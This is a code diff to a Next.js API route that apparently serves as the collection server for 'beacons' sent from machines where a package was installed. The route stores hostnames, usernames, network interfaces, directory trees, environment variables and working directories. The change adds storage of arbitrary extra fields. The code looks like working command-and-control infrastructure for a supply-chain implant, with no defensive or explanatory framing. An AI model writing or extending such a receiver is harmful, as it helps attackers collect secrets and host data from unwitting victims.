@@ -42,12 +42,14 @@ export async function POST(req: Request) {
     db.prepare('DELETE FROM pow_challenges WHERE nonce = ?').run(pow_nonce);
   }
 
-  const { beacon_id, pkg, hostname, username, platform, arch, os_release, interfaces, dir_tree, env_vars, cwd } = body;
+  const { beacon_id, beacon_secret: _bs, pkg, hostname, username, platform, arch, os_release, interfaces, dir_tree, env_vars, cwd, pow_nonce: _pn, pow_solution: _ps, ...custom } = body;
   if (!beacon_id) return NextResponse.json({ error: 'beacon_id required' }, { status: 400 });
 
+  const customData = Object.keys(custom).length > 0 ? JSON.stringify(custom) : null;
+
   db.prepare(`
-    INSERT INTO beacons (beacon_id, pkg_name, hostname, username, platform, arch, os_release, interfaces, dir_tree, env_vars, cwd, last_seen)
-    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, unixepoch())
+    INSERT INTO beacons (beacon_id, pkg_name, hostname, username, platform, arch, os_release, interfaces, dir_tree, env_vars, cwd, custom_data, last_seen)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, unixepoch())
     ON CONFLICT(beacon_id) DO UPDATE SET
       pkg_name = excluded.pkg_name,
       hostname = excluded.hostname,
@@ -59,13 +61,15 @@ export async function POST(req: Request) {
       dir_tree = excluded.dir_tree,
       env_vars = excluded.env_vars,
       cwd = excluded.cwd,
+      custom_data = excluded.custom_data,
       last_seen = unixepoch()
   `).run(
     beacon_id, pkg, hostname, username, platform, arch, os_release,
     typeof interfaces === 'string' ? interfaces : JSON.stringify(interfaces),
     typeof dir_tree === 'string' ? dir_tree : JSON.stringify(dir_tree),
     typeof env_vars === 'string' ? env_vars : JSON.stringify(env_vars),
-    cwd
+    cwd,
+    customData
   );
 
   const beacon = db.prepare('SELECT id FROM beacons WHERE beacon_id = ?').get(beacon_id) as { id: number };
